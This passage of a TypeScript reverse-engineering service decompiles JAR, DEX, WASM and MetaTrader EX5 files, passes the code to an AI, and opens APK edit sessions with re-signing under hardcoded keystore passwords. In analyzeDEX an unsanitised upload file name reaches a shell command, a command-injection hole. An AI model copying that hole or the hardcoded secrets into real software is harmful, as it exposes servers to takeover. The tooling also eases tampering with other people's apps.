    const sampleJava = files.filter(f => f.extension === ".java" && f.content).slice(0, 5).map(f => `// ${f.path}\n${f.content?.substring(0, 2000)}`).join("\n\n---\n\n");
    const vulnerabilities = scanVulnerabilities(files, fileExt === "aar" ? "apk" : "jar");
    let aiModelUsed = "";

    try {
      const { content: aiContent, modelUsed } = await callPowerAI(
        `أنت خبير في هندسة عكسية لملفات Java (JAR/AAR/DEX). تحليل شامل: هيكل المشروع، الكلاسات المهمة، APIs، حماية ProGuard/R8، نقاط الضعف، توصيات. اكتب بالعربية مع الكود بالإنجليزية.`,
        `## ${fileName} (${formatBytes(jarBuffer.length)}) — ${fileExt.toUpperCase()}\nJADX: ${jadxSuccess ? "✅ نجح" : "❌ غير متاح"}\nJava files: ${files.filter(f => f.extension === ".java").length}\nClass files: ${files.filter(f => f.extension === ".class").length}\n\n## كود Java:\n\`\`\`java\n${sampleJava.substring(0, 8000) || "لا يوجد كود مفكَّك"}\n\`\`\`\n\n## الملفات: ${files.slice(0, 200).map(f => f.path).join(", ")}`,
        12000
      );
      aiModelUsed = modelUsed;
      if (aiContent) files.push({ path: "ai-decompile/ai-jar-analysis.md", name: "ai-jar-analysis.md", extension: ".md", size: aiContent.length, content: `# تحليل AI — ${modelUsed}\n\n` + aiContent, isBinary: false });
    } catch (e: any) { console.warn("[analyzeJAR] AI:", e.message); }

    cleanupDir(tmpDir);
    const outputZip = new JSZip();
    for (const f of files) { if (f.content && !f.isBinary) outputZip.file(f.path, f.content); }
    const zipBuffer = await outputZip.generateAsync({ type: "nodebuffer" });

    return {
      success: true, fileType: "apk", totalFiles: files.length, totalSize: jarBuffer.length,
      structure: buildFileTree(files),
      files: files.map(f => ({ ...f, content: f.content?.substring(0, 50000) })),
      metadata: { format: `${fileExt.toUpperCase()} (Java Archive)`, originalSize: formatBytes(jarBuffer.length), jadxDecompiled: jadxSuccess, javaFiles: files.filter(f => f.extension === ".java").length, classFiles: files.filter(f => f.extension === ".class").length, aiModelUsed },
      zipBuffer, analysisAvailable: true, vulnerabilities,
    };
  } catch (err: any) {
    cleanupDir(tmpDir);
    return { success: false, fileType: "apk", totalFiles: 0, totalSize: 0, structure: [], files: [], error: `فشل تحليل ${fileExt.toUpperCase()}: ${err.message}`, analysisAvailable: false };
  }
}

// ════════════════════════════════════════
// EX5 Analysis (MetaTrader 5 MQL5)
// ════════════════════════════════════════

export async function analyzeEX5(ex5Buffer: Buffer, fileName: string): Promise<DecompileResult> {
  try {
    const files: DecompiledFile[] = [];
    const strings = extractEX4Strings(ex5Buffer);
    const classified = classifyEX4Strings(strings);

    const mql5Events = strings.filter(s =>
      ["OnStart", "OnInit", "OnDeinit", "OnTick", "OnTimer", "OnBookEvent", "OnTradeTransaction",
        "OnCalculate", "OnChartEvent", "CTrade", "COrderInfo", "CPositionInfo", "CAccountInfo"].some(k => s.includes(k))
    );
    const mql5Props = strings.filter(s =>
      ["#property", "copyright", "link", "version", "description", "indicator_buffers", "indicator_plots"].some(k => s.toLowerCase().includes(k.toLowerCase()))
    );
    const mql5Inds = strings.filter(s =>
      ["iMA", "iRSI", "iMACD", "iBands", "iCCI", "iStochastic", "iATR", "iADX", "iSAR", "iTEMA", "iDEMA"].some(k => s.includes(k))
    );

    const magic = ex5Buffer.slice(0, 4).toString("hex").toUpperCase();
    let build = 0; try { build = ex5Buffer.readUInt16LE(4); } catch { }

    const summary = [
      `# تحليل EX5 (MetaTrader 5 / MQL5) — ${fileName}`, ``,
      `## معلومات الملف`, `Magic: ${magic}`, `Build: ${build}`, `الحجم: ${formatBytes(ex5Buffer.length)}`,
      ``, `## الخصائص (${mql5Props.length}):`, ...mql5Props.slice(0, 20).map(p => `- ${p}`),
      ``, `## Event Handlers MQL5 (${mql5Events.length}):`, ...mql5Events.slice(0, 20).map(e => `- ${e}`),
      ``, `## المؤشرات الفنية (${mql5Inds.length}):`, ...mql5Inds.slice(0, 15).map(i => `- ${i}`),
      ``, `## جميع النصوص (${strings.length}):`, ...strings.slice(0, 80).map(s => `- ${s}`),
    ].join("\n");

    files.push({ path: "mql5/summary.md", name: "summary.md", extension: ".md", size: summary.length, content: summary, isBinary: false });
    files.push({ path: "mql5/strings.txt", name: "strings.txt", extension: ".txt", size: 0, content: strings.join("\n"), isBinary: false });

    let aiModelUsed = "";
    try {
      const sysPrompt = `أنت خبير متخصص في هندسة عكسية لملفات MQL5/EX5 (MetaTrader 5).
معرفتك: بنية EX5 الثنائية، MQL5 bytecode، event-driven architecture، CTrade/COrderInfo/CPositionInfo classes.
مهمتك إعادة بناء:
1. #property declarations
2. input/sinput parameters مع أنواعها وقيمها الافتراضية
3. Event handlers (OnInit، OnDeinit، OnTick، OnTimer إلخ)
4. منطق التداول وإدارة المراكز
5. المؤشرات الفنية وإعداداتها
6. كود MQL5 مُعاد بناؤه بالكامل مع تعليقات
اكتب الكود بالإنجليزية مع شرح بالعربية.`;

      const { content: aiContent, modelUsed } = await callPowerAI(
        sysPrompt,
        `## ${fileName} (${formatBytes(ex5Buffer.length)}) — MQL5 Expert/Indicator\n## Strings (${strings.length}):\n\`\`\`\n${strings.slice(0, 400).join("\n")}\n\`\`\`\n## Hex Dump:\n\`\`\`\n${generateHexDump(ex5Buffer, 150_000)}\n\`\`\``,
        16000
      );
      aiModelUsed = modelUsed;
      if (aiContent) {
        files.push({ path: "ai-decompile/ai-reconstructed.mq5", name: "ai-reconstructed.mq5", extension: ".mq5", size: aiContent.length, content: aiContent, isBinary: false });
      }
    } catch (e: any) { console.warn("[analyzeEX5] AI:", e.message); }

    const outputZip = new JSZip();
    for (const f of files) { if (f.content) outputZip.file(f.path, f.content); }
    const zipBuffer = await outputZip.generateAsync({ type: "nodebuffer" });

    return {
      success: true, fileType: "exe", totalFiles: files.length, totalSize: ex5Buffer.length,
      structure: buildFileTree(files), files,
      metadata: { format: "EX5 (MetaTrader 5 MQL5)", originalSize: formatBytes(ex5Buffer.length), magicBytes: magic, buildNumber: build, stringsCount: strings.length, mql5Events: mql5Events.length, aiModelUsed },
      zipBuffer, analysisAvailable: true,
    };
  } catch (err: any) {
    return { success: false, fileType: "exe", totalFiles: 0, totalSize: 0, structure: [], files: [], error: `فشل تحليل EX5: ${err.message}`, analysisAvailable: false };
  }
}

// ════════════════════════════════════════
// WASM Analysis (WebAssembly)
// ════════════════════════════════════════

interface WasmSection { id: number; name: string; size: number; }
function parseWasmSections(buf: Buffer): WasmSection[] {
  const sections: WasmSection[] = [];
  const names: Record<number, string> = { 0: "Custom", 1: "Type", 2: "Import", 3: "Function", 4: "Table", 5: "Memory", 6: "Global", 7: "Export", 8: "Start", 9: "Element", 10: "Code", 11: "Data", 12: "DataCount" };
  if (buf.length < 8 || buf[0] !== 0x00 || buf[1] !== 0x61 || buf[2] !== 0x73 || buf[3] !== 0x6d) return sections;
  let offset = 8;
  while (offset < buf.length - 1) {
    try {
      const id = buf[offset++];
      let size = 0, shift = 0;
      while (offset < buf.length) { const b = buf[offset++]; size |= (b & 0x7f) << shift; if (!(b & 0x80)) break; shift += 7; }
      sections.push({ id, name: names[id] || `Unknown(${id})`, size });
      offset += size;
    } catch { break; }
  }
  return sections;
}

export async function analyzeWASM(wasmBuffer: Buffer, fileName: string): Promise<DecompileResult> {
  try {
    const files: DecompiledFile[] = [];
    const sections = parseWasmSections(wasmBuffer);
    const ver = wasmBuffer.length >= 8 ? wasmBuffer.readUInt32LE(4) : 0;
    const strings = extractStrings(wasmBuffer, 4);

    const summary = [
      `# تحليل WebAssembly (WASM) — ${fileName}`,
      `Magic: 0x0061736D (\\0asm)`, `Version: ${ver} (${ver === 1 ? "MVP 1.0" : "?"})`,
      `الحجم: ${formatBytes(wasmBuffer.length)}`,
      ``, `## الأقسام (${sections.length}):`,
      ...sections.map(s => `- [${s.id}] ${s.name}: ${s.size} bytes`),
      ``, `## النصوص (${strings.length}):`, ...strings.slice(0, 60).map(s => `- ${s}`),
    ].join("\n");

    files.push({ path: "wasm/summary.md", name: "summary.md", extension: ".md", size: summary.length, content: summary, isBinary: false });
    files.push({ path: "wasm/sections.json", name: "sections.json", extension: ".json", size: 0, content: JSON.stringify(sections, null, 2), isBinary: false });
    files.push({ path: "wasm/strings.txt", name: "strings.txt", extension: ".txt", size: 0, content: strings.join("\n"), isBinary: false });

    const tmpDir = path.join(os.tmpdir(), `hayo-wasm-${Date.now()}`);
    fs.mkdirSync(tmpDir, { recursive: true });
    const safeFileName = path.basename(fileName).replace(/[^a-zA-Z0-9._-]/g, "_") || "input.wasm";
    const wasmPath = path.join(tmpDir, safeFileName);
    fs.writeFileSync(wasmPath, wasmBuffer);
    const watContent = runWasm2wat(wasmPath);
    if (watContent) {
      files.push({ path: "wasm/decompiled.wat", name: "decompiled.wat", extension: ".wat", size: watContent.length, content: watContent.substring(0, 500000), isBinary: false });
    }
    cleanupDir(tmpDir);

    let aiModelUsed = "";
    try {
      const watPreview = watContent ? watContent.substring(0, 30000) : "";
      const { content: aiContent, modelUsed } = await callPowerAI(
        `أنت خبير في WebAssembly (WASM) وهندسته العكسية. تحليل: الأقسام، imports/exports، اللغة المصدر (C/C++/Rust/Go)، الدوال الرئيسية، تحليل أمني. إذا وُجد WAT اشرح كل دالة بالتفصيل وحوّلها لـ C/Rust. اكتب بالعربية.`,
        `## ${fileName} (${formatBytes(wasmBuffer.length)})\nVersion: ${ver}\nSections: ${sections.map(s => s.name).join(", ")}\nStrings: ${strings.slice(0, 100).join(", ")}\n\n${watPreview ? `## WAT Decompiled:\n\`\`\`wat\n${watPreview}\n\`\`\`` : `## Hex:\n\`\`\`\n${generateHexDump(wasmBuffer, 80_000)}\n\`\`\``}`,
        16000
      );
      aiModelUsed = modelUsed;
      if (aiContent) files.push({ path: "ai-decompile/ai-wasm-analysis.md", name: "ai-wasm-analysis.md", extension: ".md", size: aiContent.length, content: `# تحليل WASM AI (${modelUsed})\n\n` + aiContent, isBinary: false });
    } catch (e: any) { console.warn("[analyzeWASM] AI:", e.message); }

    const outputZip = new JSZip();
    for (const f of files) { if (f.content) outputZip.file(f.path, f.content); }
    const zipBuffer = await outputZip.generateAsync({ type: "nodebuffer" });

    return {
      success: true, fileType: "exe", totalFiles: files.length, totalSize: wasmBuffer.length,
      structure: buildFileTree(files), files,
      metadata: { format: "WASM (WebAssembly)", originalSize: formatBytes(wasmBuffer.length), version: ver, sections: sections.length, aiModelUsed },
      zipBuffer, analysisAvailable: true,
    };
  } catch (err: any) {
    return { success: false, fileType: "exe", totalFiles: 0, totalSize: 0, structure: [], files: [], error: `فشل تحليل WASM: ${err.message}`, analysisAvailable: false };
  }
}

// ════════════════════════════════════════
// DEX Analysis (Dalvik Executable)
// ════════════════════════════════════════

export async function analyzeDEX(dexBuffer: Buffer, fileName: string): Promise<DecompileResult> {
  const tmpDir = path.join(os.tmpdir(), `hayo-dex-${Date.now()}`);
  const dexPath = path.join(tmpDir, fileName);
  const javaOutputDir = path.join(tmpDir, "java-source");
  try {
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.writeFileSync(dexPath, dexBuffer);
    const files: DecompiledFile[] = [];
    let jadxSuccess = false;

    const magic = dexBuffer.slice(0, 7).toString("ascii").replace(/\x0a|\x00/g, "");
    const ver = dexBuffer.length > 7 ? dexBuffer.slice(4, 7).toString("ascii") : "?";
    const classCount = dexBuffer.length > 100 ? dexBuffer.readUInt32LE(96) : 0;

    const jadxBin = findJadx();

    if (jadxBin) {
      fs.mkdirSync(javaOutputDir, { recursive: true });
      try {
        execSync(`"${jadxBin}" --no-res --output-dir "${javaOutputDir}" "${dexPath}"`, { timeout: 300000, stdio: "pipe" });
        jadxSuccess = true;
        for (const jf of readDirRecursive(javaOutputDir)) {
          const relPath = path.relative(javaOutputDir, jf);
          const ext = path.extname(jf).toLowerCase();
          let content: string | undefined;
          try { const s = fs.statSync(jf); if (s.size < 2000000) content = fs.readFileSync(jf, "utf-8"); } catch { }
          files.push({ path: `java-source/${relPath}`, name: path.basename(jf), extension: ext, size: fs.existsSync(jf) ? fs.statSync(jf).size : 0, content, isBinary: false });
        }
      } catch (e: any) { console.warn("[analyzeDEX] JADX:", e.message); }
    }

    const strs = extractStrings(dexBuffer);
    files.push({ path: "dex/strings.txt", name: "strings.txt", extension: ".txt", size: 0, content: strs.join("\n"), isBinary: false });
    files.push({ path: "dex/info.txt", name: "info.txt", extension: ".txt", size: 0, content: `DEX Magic: ${magic}\nVersion: ${ver}\nClass Count: ${classCount}\nSize: ${formatBytes(dexBuffer.length)}\nJADX: ${jadxSuccess ? "✅ نجح" : "❌ غير متاح"}`, isBinary: false });

    const vulnerabilities = scanVulnerabilities(files, "apk", strs.slice(0, 500));
    const sampleJava = files.filter(f => f.extension === ".java" && f.content).slice(0, 4).map(f => `// ${f.path}\n${f.content?.substring(0, 2000)}`).join("\n\n");
    let aiModelUsed = "";

    try {
      const { content: aiContent, modelUsed } = await callPowerAI(
        `أنت خبير في تحليل DEX (Dalvik/ART). تحليل: class structure، obfuscation (ProGuard/R8)، وظيفة الكود، نقاط الضعف. اكتب بالعربية.`,
        `## ${fileName} (DEX v${ver})\nClasses: ${classCount}, JADX: ${jadxSuccess ? "✅" : "❌"}\n\`\`\`java\n${sampleJava.substring(0, 8000)}\n\`\`\`\nStrings: ${strs.slice(0, 200).join(", ")}`,
        12000
      );
      aiModelUsed = modelUsed;
      if (aiContent) files.push({ path: "ai-decompile/ai-dex-analysis.md", name: "ai-dex-analysis.md", extension: ".md", size: aiContent.length, content: aiContent, isBinary: false });
    } catch { /* skip */ }

    cleanupDir(tmpDir);
    const outputZip = new JSZip();
    for (const f of files) { if (f.content) outputZip.file(f.path, f.content); }
    const zipBuffer = await outputZip.generateAsync({ type: "nodebuffer" });

    return {
      success: true, fileType: "apk", totalFiles: files.length, totalSize: dexBuffer.length,
      structure: buildFileTree(files),
      files: files.map(f => ({ ...f, content: f.content?.substring(0, 50000) })),
      metadata: { format: `DEX (Dalvik v${ver})`, originalSize: formatBytes(dexBuffer.length), version: ver, classCount, jadxSuccess, aiModelUsed },
      zipBuffer, analysisAvailable: true, vulnerabilities,
    };
  } catch (err: any) {
    cleanupDir(tmpDir);
    return { success: false, fileType: "apk", totalFiles: 0, totalSize: 0, structure: [], files: [], error: `فشل تحليل DEX: ${err.message}`, analysisAvailable: false };
  }
}

// ════════════════════════════════════════
// Edit Sessions — In-memory store
// ════════════════════════════════════════

interface EditSession {
  dir: string;
  decompDir: string;
  apkPath: string;
  fileType: "apk" | "exe" | "dll" | "ex4" | "ex5" | "ipa" | "jar" | "aar" | "dex" | "so" | "elf" | "wasm";
  originalContents: Map<string, string>;
  modifiedPaths: Set<string>;
  expiresAt: number;
}

export const editSessions = new Map<string, EditSession>();

setInterval(() => {
  const now = Date.now();
  for (const [id, session] of editSessions) {
    if (now > session.expiresAt) {
      cleanupDir(session.dir);
      editSessions.delete(id);
    }
  }
}, 10 * 60 * 1000);

// ════════════════════════════════════════
// Find APKTool
// ════════════════════════════════════════

// Returns apktool command string: either binary ("apktool") or jar path
export function findApkTool(): string | null {
  try {
    execSync("apktool --version", { timeout: 5000, stdio: "pipe" });
    return "BINARY";
  } catch { /* not in PATH */ }

  const jarPaths = [
    "/home/runner/apktool/apktool.jar",
    "/home/runner/apktool.jar",
    "/usr/local/bin/apktool.jar",
    path.join(process.cwd(), "apktool.jar"),
    "/tmp/apktool.jar",
    path.join(os.homedir(), "apktool.jar"),
  ];
  for (const p of jarPaths) {
    if (fs.existsSync(p) && fs.statSync(p).size > 100000) return p;
  }

  if (isJavaAvailable()) {
    try {
      const downloadPath = "/home/runner/apktool/apktool.jar";
      fs.mkdirSync("/home/runner/apktool", { recursive: true });
      console.log("[RE] APKTool not found — downloading...");
      execSync(
        `curl -sL "https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar" -o "${downloadPath}"`,
        { timeout: 60000, stdio: "pipe" }
      );
      if (fs.existsSync(downloadPath) && fs.statSync(downloadPath).size > 1000000) {
        console.log("[RE] ✅ APKTool downloaded successfully");
        return downloadPath;
      }
    } catch (e: any) {
      console.warn("[RE] APKTool download failed:", e.message?.slice(0, 100));
    }
  }

  return null;
}

function findApkSigner(): string | null {
  const paths = [
    path.join(os.homedir(), "uber-apk-signer.jar"),
    "/tmp/uber-apk-signer.jar",
    path.join(process.cwd(), "uber-apk-signer.jar"),
  ];
  for (const p of paths) {
    if (fs.existsSync(p) && fs.statSync(p).size > 100000) return p;
  }
  return null;
}

const DEBUG_KEYSTORE = "/home/runner/debug.keystore";
const KEYSTORE_PASS = "android";
const KEY_ALIAS = "androiddebugkey";

function ensureKeystore(): string {
  if (fs.existsSync(DEBUG_KEYSTORE)) return DEBUG_KEYSTORE;
  const fallback = path.join(os.tmpdir(), "hayo-debug.jks");
  if (fs.existsSync(fallback)) return fallback;
  try {
    execSync(
      `keytool -genkeypair -v -keystore "${fallback}" -keyalg RSA -keysize 2048 -validity 10000 -alias ${KEY_ALIAS} -storepass ${KEYSTORE_PASS} -keypass ${KEYSTORE_PASS} -dname "CN=HAYO AI, OU=RE, O=HAYO, L=Unknown, ST=Unknown, C=US"`,
      { timeout: 60000, stdio: "pipe" }
    );
  } catch { /* skip */ }
  return fallback;
}

function signWithJarsigner(apkPath: string): boolean {
  const ks = ensureKeystore();
  try {
    execSync(
      `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "${ks}" -storepass ${KEYSTORE_PASS} -keypass ${KEYSTORE_PASS} "${apkPath}" ${KEY_ALIAS}`,
      { timeout: 300000, stdio: "pipe" }
    );
    return true;
  } catch (e: any) {
    console.warn("[RE] jarsigner failed:", e.message?.slice(0, 150));
    return false;
  }
}

function findJadx(): string | null {
  const paths = [
    "/home/runner/jadx/bin/jadx",
    "/usr/bin/jadx",
    path.join(os.homedir(), "jadx/bin/jadx"),
  ];
  for (const p of paths) {
    if (fs.existsSync(p)) return p;
  }
  try {
    execSync("jadx --version", { timeout: 5000, stdio: "pipe" });
    return "jadx";
  } catch {}

  if (isJavaAvailable()) {
    try {
      const jadxDir = path.join(os.homedir(), "jadx");
      const jadxBin = path.join(jadxDir, "bin", "jadx");
      const jadxZip = path.join(os.tmpdir(), "jadx-1.5.1.zip");
      const url = "https://github.com/skylot/jadx/releases/download/v1.5.1/jadx-1.5.1.zip";

      console.log("[RE] JADX not found — downloading v1.5.1 from GitHub...");
      execSync(`curl -fsSL -o "${jadxZip}" "${url}"`, { timeout: 300000, stdio: "pipe" });

      if (fs.existsSync(jadxDir)) fs.rmSync(jadxDir, { recursive: true, force: true });
      fs.mkdirSync(jadxDir, { recursive: true });
      execSync(`unzip -o -q "${jadxZip}" -d "${jadxDir}"`, { timeout: 60000, stdio: "pipe" });
      execSync(`chmod +x "${jadxBin}"`, { timeout: 5000, stdio: "pipe" });

      try { fs.unlinkSync(jadxZip); } catch {}

      if (fs.existsSync(jadxBin)) {
        console.log("[RE] ✅ JADX installed successfully at", jadxBin);
        return jadxBin;
      }
    } catch (e: any) {
      console.error("[RE] ❌ Failed to auto-install JADX:", e.message?.slice(0, 200));
    }
  }

  return null;
}

function runReadelf(filePath: string): string {
  try {
    return execSync(`readelf -a "${filePath}" 2>/dev/null`, { timeout: 60000, maxBuffer: 10 * 1024 * 1024 }).toString();
  } catch { return ""; }
}

function runObjdump(filePath: string, maxBytes = 200000): string {
  try {
    const out = execSync(`objdump -d -M intel --no-show-raw-insn "${filePath}" 2>/dev/null`, { timeout: 60000, maxBuffer: 10 * 1024 * 1024 }).toString();
    return out.substring(0, maxBytes);
  } catch { return ""; }
}

function runWasm2wat(wasmPath: string): string {
  try {
    return execSync(`wasm2wat "${wasmPath}" 2>/dev/null`, { timeout: 60000, maxBuffer: 10 * 1024 * 1024 }).toString();
  } catch { return ""; }
}

// Build the apktool command based on what's available
function buildApkToolCmd(apktoolPath: string, args: string): string {
  if (apktoolPath === "BINARY") {
    return `apktool ${args}`;
  }
  return `java -jar "${apktoolPath}" ${args}`;
}

export function isJavaAvailable(): boolean {
  try {
    execSync("java -version", { timeout: 5000, stdio: "pipe" });
    return true;
  } catch {
    return false;
  }
}

export function isApkToolAvailable(): boolean {
  return !!findApkTool();
}

export function getToolStatus(): Record<string, any> {
  const check = (cmd: string) => { try { execSync(cmd, { timeout: 5000, stdio: "pipe" }); return true; } catch { return false; } };
  const ver = (cmd: string) => { try { return execSync(cmd, { timeout: 5000, stdio: "pipe" }).toString().trim().split("\n")[0]; } catch { return null; } };

  let keystoreExists = fs.existsSync("/home/runner/debug.keystore") || fs.existsSync("/tmp/hayo-debug.jks");
  if (!keystoreExists && isJavaAvailable()) {
    try {
      const ksPath = "/tmp/hayo-debug.jks";
      execSync(
        `keytool -genkeypair -v -keystore "${ksPath}" -alias hayo -keyalg RSA -keysize 2048 -validity 10000 -storepass hayoai123 -keypass hayoai123 -dname "CN=HAYO,OU=RE,O=HAYO,L=AI,S=AI,C=US"`,
        { timeout: 15000, stdio: "pipe" }
      );
      keystoreExists = fs.existsSync(ksPath);
      if (keystoreExists) console.log("[RE] Auto-created debug keystore at", ksPath);
    } catch (e: any) {
      console.warn("[RE] Failed to auto-create keystore:", e.message?.slice(0, 100));
    }
  }

  return {
    javaAvailable: isJavaAvailable(),
    apkToolAvailable: isApkToolAvailable(),
    apkToolPath: findApkTool(),
    jadxVersion: (() => { const jp = findJadx(); if (!jp) return null; try { return execSync(`"${jp}" --version`, { timeout: 10000, stdio: "pipe" }).toString().trim().split("\n")[0]; } catch { return "installed"; } })(),
    apkToolVersion: findApkTool() ? ver(`java -jar "${findApkTool()}" --version`) : null,
    jarsignerAvailable: check("jarsigner 2>&1"),
    keytoolAvailable: check("keytool -help 2>&1"),
    keystoreExists,
    wasm2watAvailable: check("wasm2wat --version"),
    readelfAvailable: check("readelf --version"),
    objdumpAvailable: check("objdump --version"),
    stringsAvailable: check("strings --version"),
    xxdAvailable: check("xxd --version 2>&1"),
  };
}

// ════════════════════════════════════════
// Decompile APK for Editing (APKTool mode)
// ════════════════════════════════════════

export async function decompileAPKForEdit(apkBuffer: Buffer, fileName: string = "input.apk"): Promise<{
  success: boolean;
  sessionId: string;
  files: DecompiledFile[];
  structure: FileTreeNode[];
  usedApkTool: boolean;
  error?: string;
}> {
  const sessionId = `edit-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const sessionDir = path.join(os.tmpdir(), `hayo-edit-${sessionId}`);
  const apkPath = path.join(sessionDir, "original.apk");
  const decompDir = path.join(sessionDir, "decompiled");

  try {
    fs.mkdirSync(sessionDir, { recursive: true });
    fs.writeFileSync(apkPath, apkBuffer);

    const textExts = [
      ".smali", ".xml", ".txt", ".json", ".properties",
      ".yml", ".yaml", ".cfg", ".ini", ".pro", ".gradle", ".mf", ".sf",
    ];

    const files: DecompiledFile[] = [];
    let usedApkTool = false;

    const apktoolPath = findApkTool();
    if (apktoolPath) {
      const tryApkTool = (flags: string, label: string): boolean => {
        try {
          execSync(
            buildApkToolCmd(apktoolPath, `d -f ${flags} -o "${decompDir}" "${apkPath}"`),
            { timeout: 600000, stdio: "pipe" }
          );
          return true;
        } catch (e: any) {
          const hasDirs = fs.existsSync(decompDir) &&
            fs.readdirSync(decompDir).some(d => d.startsWith("smali"));
          if (hasDirs) {
            console.warn(`[RE] APKTool ${label} exited with warnings but produced smali — using it`);
            return true;
          }
          console.warn(`[RE] APKTool ${label} failed:`, e.message?.slice(0, 200));
          return false;
        }
      };

      usedApkTool = tryApkTool("", "full decode");
      if (!usedApkTool) {
        usedApkTool = tryApkTool("-r", "no-res decode");
      }
    }

    if (usedApkTool) {
      // Read from APKTool output
      const allFilePaths = readDirRecursive(decompDir);
      for (const filePath of allFilePaths) {
        const relPath = path.relative(decompDir, filePath);
        const ext = path.extname(filePath).toLowerCase();
        const isText = textExts.includes(ext);
        let content: string | undefined;
        if (isText) {
          try {
            const stat = fs.statSync(filePath);
            if (stat.size < 500000) content = fs.readFileSync(filePath, "utf-8");
          } catch { /* skip */ }
        }
        files.push({
          path: relPath,
          name: path.basename(filePath),
          extension: ext,
          size: (() => { try { return fs.statSync(filePath).size; } catch { return 0; } })(),
          content,
          isBinary: !isText,
        });
      }
    } else {
      // Fallback: ZIP extraction (same as decompileAPK)
      fs.mkdirSync(decompDir, { recursive: true });
      const zip = await JSZip.loadAsync(apkBuffer);
      for (const [entryName, entry] of Object.entries(zip.files)) {
        if (entry.dir) continue;
        const ext = path.extname(entryName).toLowerCase();
        const isText = textExts.includes(ext);
        const data = await entry.async("nodebuffer");
        // Write to disk so we can rebuild as ZIP later
        const fullPath = path.join(decompDir, entryName);
        fs.mkdirSync(path.dirname(fullPath), { recursive: true });
        fs.writeFileSync(fullPath, data);
        let content: string | undefined;
        if (isText && data.length < 2000000) {
          content = new TextDecoder("utf-8", { fatal: false }).decode(data);
        }
        files.push({
          path: entryName,
          name: path.basename(entryName),
          extension: ext,
          size: data.length,
          content,
          isBinary: !isText,
        });
      }
    }

    // Store original contents for diff/revert
    const originalContents = new Map<string, string>();
    for (const f of files) {
      if (f.content !== undefined) originalContents.set(f.path, f.content);
    }

    editSessions.set(sessionId, {
      dir: sessionDir,
      decompDir,
      apkPath,
      fileType: "apk",
      originalName: fileName,
      originalContents,
      modifiedPaths: new Set(),
      expiresAt: Date.now() + 30 * 60 * 1000,
    });

    return {
      success: true,
      sessionId,
      files,
      structure: buildFileTree(files),
      usedApkTool,
    };
  } catch (err: any) {
    cleanupDir(sessionDir);
    return {
      success: false,
      sessionId: "",
      files: [],
      structure: [],
      usedApkTool: false,
      error: `فشل التفكيك: ${err.message}`,
    };
  }
}

// ════════════════════════════════════════
// Save File Edit
// ════════════════════════════════════════

export function saveFileEdit(
  sessionId: string,
  filePath: string,
  newContent: string
): { success: boolean; error?: string } {
  const session = editSessions.get(sessionId);
  if (!session) return { success: false, error: "الجلسة منتهية أو غير موجودة" };
  if (Date.now() > session.expiresAt) {
    editSessions.delete(sessionId);
    cleanupDir(session.dir);
    return { success: false, error: "انتهت صلاحية الجلسة (30 دقيقة)" };
  }

  const fullPath = path.join(session.decompDir, filePath);
  if (!fullPath.startsWith(session.decompDir + path.sep) && fullPath !== session.decompDir) {
    return { success: false, error: "مسار غير صالح" };
  }

  try {
    fs.mkdirSync(path.dirname(fullPath), { recursive: true });
    fs.writeFileSync(fullPath, newContent, "utf-8");
    session.modifiedPaths.add(filePath);
    session.expiresAt = Date.now() + 30 * 60 * 1000; // Refresh TTL
    return { success: true };
  } catch (err: any) {
    return { success: false, error: `فشل الحفظ: ${err.message}` };
  }
}

export function getSessionInfo(sessionId: string): {
  exists: boolean;
  modifiedCount: number;
  modifiedPaths: string[];
  minutesLeft: number;
  usedApkTool?: boolean;
} {
  const session = editSessions.get(sessionId);
  if (!session) return { exists: false, modifiedCount: 0, modifiedPaths: [], minutesLeft: 0 };
  const minutesLeft = Math.max(0, Math.floor((session.expiresAt - Date.now()) / 60000));
  return {
    exists: true,
    modifiedCount: session.modifiedPaths.size,
    modifiedPaths: Array.from(session.modifiedPaths),
    minutesLeft,
  };
}

// Read a single file's content from the session directory (used for non-APK types)
export function readSessionFileContent(sessionId: string, filePath: string): { success: boolean; content?: string; error?: string } {
  const session = editSessions.get(sessionId);
  if (!session) return { success: false, error: "الجلسة غير موجودة أو انتهت" };
  // Refresh TTL
  session.expiresAt = Math.max(session.expiresAt, Date.now() + 30 * 60 * 1000);
  // Try session original contents map first
  if (session.originalContents.has(filePath)) {
    // Check if file was modified (read from disk)
    const diskPath = path.join(session.decompDir, filePath);
    if (session.modifiedPaths.has(filePath) && fs.existsSync(diskPath)) {
      try { return { success: true, content: fs.readFileSync(diskPath, "utf-8") }; } catch { /* fallback */ }
    }
    return { success: true, content: session.originalContents.get(filePath) };
  }
  // Try reading from disk
  const diskPath = path.join(session.decompDir, filePath);
  if (fs.existsSync(diskPath)) {
    try {
      const stat = fs.statSync(diskPath);
      if (stat.size > 500000) return { success: false, error: "الملف كبير جداً للعرض" };
      return { success: true, content: fs.readFileSync(diskPath, "utf-8") };
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }
  return { success: false, error: "الملف غير موجود في الجلسة" };
}

// Helper: store analysis result in an edit session
async function buildAnalysisEditSession(
  result: DecompileResult,
  fileBuffer: Buffer,
  fileName: string,
  ext: EditSession["fileType"]
): Promise<{ success: boolean; sessionId: string; files: DecompiledFile[]; structure: FileTreeNode[]; usedApkTool: boolean; fileType: string; error?: string }> {
  const sessionId = `edit-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const sessionDir = path.join(os.tmpdir(), `hayo-edit-${sessionId}`);
  const decompDir = path.join(sessionDir, "decompiled");
  try {
    fs.mkdirSync(decompDir, { recursive: true });
    fs.writeFileSync(path.join(sessionDir, `original.${ext}`), fileBuffer);

    const originalContents = new Map<string, string>();
    const sessionFiles: DecompiledFile[] = [];
    for (const f of result.files) {
      if (f.content !== undefined) {
        const fullPath = path.join(decompDir, f.path);
        fs.mkdirSync(path.dirname(fullPath), { recursive: true });
        fs.writeFileSync(fullPath, f.content, "utf-8");
        originalContents.set(f.path, f.content);
        sessionFiles.push({ ...f, content: undefined });
      }
    }
    editSessions.set(sessionId, { dir: sessionDir, decompDir, apkPath: path.join(sessionDir, `original.${ext}`), fileType: ext, originalName: fileName, originalContents, modifiedPaths: new Set(), expiresAt: Date.now() + 30 * 60 * 1000 });
    return { success: true, sessionId, files: sessionFiles, structure: result.structure, usedApkTool: false, fileType: ext };
  } catch (err: any) {
    cleanupDir(sessionDir);
    return { success: false, sessionId: "", files: [], structure: [], usedApkTool: false, fileType: ext, error: err.message };
  }
}

// Unified decompile-for-edit: handles ALL supported formats
